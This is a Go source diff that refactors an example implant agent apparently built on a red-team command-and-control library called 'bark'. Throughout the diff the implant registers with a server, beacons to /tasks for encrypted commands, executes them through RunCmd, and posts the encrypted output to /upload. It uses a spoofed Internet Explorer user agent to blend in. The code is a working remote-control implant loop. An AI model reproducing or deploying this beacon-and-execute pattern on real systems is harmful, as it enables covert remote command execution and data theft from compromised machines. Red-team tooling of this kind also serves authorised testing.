@@ -6,7 +6,7 @@ import (
 	"os"
 	"time"
 
-	bark "github.com/salukikit/bark/pkg/barkagent"
+	"github.com/salukikit/bark"
 )
 
 func RunCmd(cmd string) string {
@@ -49,9 +49,8 @@ func main() {
 	mybarker := bark.NewBarkerHTTP("mynewhttpcomms", verifycert)
 	mybarker.Ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
 
-	//root url should include the protocol, e.g. http:// or https://
-
-	rooturl := "https://127.0.0.1:8080"
+	//Addr should include the protocol, e.g. http:// or https://
+	mybarker.Addr = "https://127.0.0.1:8080"
 
 	/*
 		You can also manually specify Transport config etc via the .tr field like so:
@@ -69,8 +68,13 @@ func main() {
 	for reg != true {
 		fmt.Println("Attempting to register")
 
-		regurl := rooturl + "/register"
-		resp, err := mybarker.Beacon(regurl)
+		//Set BarkMsg for registering implant.
+		registermessage := &bark.BarkMsg{
+			Uri:    "/register",
+			Method: "GET",
+		}
+
+		resp, err := mybarker.Bark(*registermessage)
 		if err != nil {
 
 			time.Sleep(beacontime)
@@ -93,10 +97,12 @@ func main() {
 
 		fmt.Println("Awaiting tasks")
 
-		beaconurl := rooturl + "/tasks"
-		posturl := rooturl + "/tasks"
-
-		encCmd, err := mybarker.Beacon(beaconurl)
+		//Set BarkMsg for beaconing.
+		beaconmsg := &bark.BarkMsg{
+			Uri:    "/tasks",
+			Method: "GET",
+		}
+		encCmd, err := mybarker.Bark(*beaconmsg)
 		if err != nil {
 			time.Sleep(beacontime)
 			continue
@@ -108,8 +114,14 @@ func main() {
 			output := RunCmd(cmd)
 			encdata, ok := YourEncryptFunc([]byte(output))
 			if ok {
+
+				taskcompletemsg := &bark.BarkMsg{
+					Uri:    "/upload",
+					Method: "POST",
+					Body:   []byte(encdata),
+				}
 				//taskid := "123" TaskID could be handled in the JWT, the body, or by path e.g. /task/123. This is up to you.
-				_, err := mybarker.PostOutput(posturl, []byte(encdata))
+				_, err := mybarker.Bark(*taskcompletemsg)
 				if err != nil {
 					continue
 				}
